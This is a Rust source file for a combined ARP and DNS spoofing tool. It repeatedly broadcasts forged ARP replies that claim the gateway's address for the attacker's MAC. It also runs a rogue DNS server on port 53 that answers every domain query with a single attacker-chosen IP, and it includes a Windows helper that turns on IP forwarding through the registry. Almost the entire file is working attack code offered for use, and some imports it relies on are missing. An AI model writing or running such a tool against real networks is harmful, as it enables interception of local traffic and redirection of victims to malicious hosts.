use colored::Colorize;
use pnet::datalink::{self, Channel::Ethernet, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::io::{self, Write};
use std::net::{Ipv4Addr, UdpSocket};
use std::thread;
use trust_dns_proto::op::{Message, MessageType};
use trust_dns_proto::rr::{RData, Record};
use trust_dns_proto::serialize::binary::{BinDecodable, BinEncodable, BinEncoder};

#[cfg(target_os = "windows")]
fn enable_ip_forwarding() -> std::io::Result<()> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let tcpip = hklm.open_subkey_with_flags(
        "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
        KEY_WRITE,
    )?;
    tcpip.set_value("IPEnableRouter", &1u32)?;
    Ok(())
}

fn get_interface_input() -> String {
    for iface in datalink::interfaces() {
        println!("{}", iface.name.red().bold());
    }
    print!("Enter interface: ");
    io::stdout().flush().unwrap();
    let mut iface = String::new();
    io::stdin().read_line(&mut iface).unwrap();
    iface.trim().to_string()
}

fn get_ip(prompt: &str) -> Ipv4Addr {
    print!("{}: ", prompt);
    io::stdout().flush().unwrap();
    let mut ip = String::new();
    io::stdin().read_line(&mut ip).unwrap();
    ip.trim().parse().unwrap()
}

fn start_arp_spoofing(
    mut tx: Box<dyn datalink::DataLinkSender>,
    attacker_mac: MacAddr,
    gateway_ip: Ipv4Addr,
) {
    thread::spawn(move || {
        let mut arp_buffer = [0u8; 28];
        let mut ethernet_buffer = [0u8; 42];

        loop {
            let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(attacker_mac);
            arp_packet.set_sender_proto_addr(gateway_ip);
            arp_packet.set_target_hw_addr(MacAddr::broadcast());
            arp_packet.set_target_proto_addr(Ipv4Addr::new(0, 0, 0, 0));

            let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
            ethernet_packet.set_destination(MacAddr::broadcast());
            ethernet_packet.set_source(attacker_mac);
            ethernet_packet.set_ethertype(EtherTypes::Arp);
            ethernet_packet.set_payload(arp_packet.packet_mut());

            let _ = tx.send_to(ethernet_packet.packet(), None);
            thread::sleep(std::time::Duration::from_secs(1));
        }
    });
}

pub(crate) fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Starting DNS/ARP spoofer... Press Ctrl+C to stop");

    let iface = get_interface_input();
    let gateway_ip = get_ip("Gateway IP");

    let attacker_mac_bytes = mac_address::mac_address_by_name(&iface)?
        .ok_or("MAC not found")?
        .bytes();
    let attacker_mac = MacAddr::new(
        attacker_mac_bytes[0],
        attacker_mac_bytes[1],
        attacker_mac_bytes[2],
        attacker_mac_bytes[3],
        attacker_mac_bytes[4],
        attacker_mac_bytes[5],
    );

    let interface = datalink::interfaces()
        .into_iter()
        .find(|i| i.name == iface)
        .ok_or("Interface not found")?;

    let (tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _)) => (tx, ()),
        _ => return Err("Failed to create datalink channel".into()),
    };

    print!("Enter the IP address you want to spoof to: ");
    io::stdout().flush()?;
    let mut spoof_ip = String::new();
    io::stdin().read_line(&mut spoof_ip)?;
    let spoof_ip = spoof_ip.trim().to_string();

    start_arp_spoofing(tx, attacker_mac, gateway_ip);

    let socket = UdpSocket::bind("0.0.0.0:53")?;
    let mut buf = [0u8; 512];
    println!("DNS spoofer running on port 53");
    println!("Spoofing ALL domains to {}", spoof_ip);

    loop {
        let (amt, src_addr) = socket.recv_from(&mut buf)?;
        let query = match Message::from_bytes(&buf[..amt]) {
            Ok(q) => q,
            Err(_) => continue,
        };

        let mut response = Message::new();
        response.set_id(query.id());
        response.set_message_type(MessageType::Response);

        for q in query.queries() {
            response.add_query(q.clone());
            let record = Record::from_rdata(q.name().clone(), 60, RData::A(spoof_ip.parse()?));
            response.add_answer(record);
        }

        let mut resp_buf = Vec::with_capacity(128);
        let mut encoder = BinEncoder::new(&mut resp_buf);
        if response.emit(&mut encoder).is_ok() {
            let _ = socket.send_to(&resp_buf, src_addr);
        }
    }
}
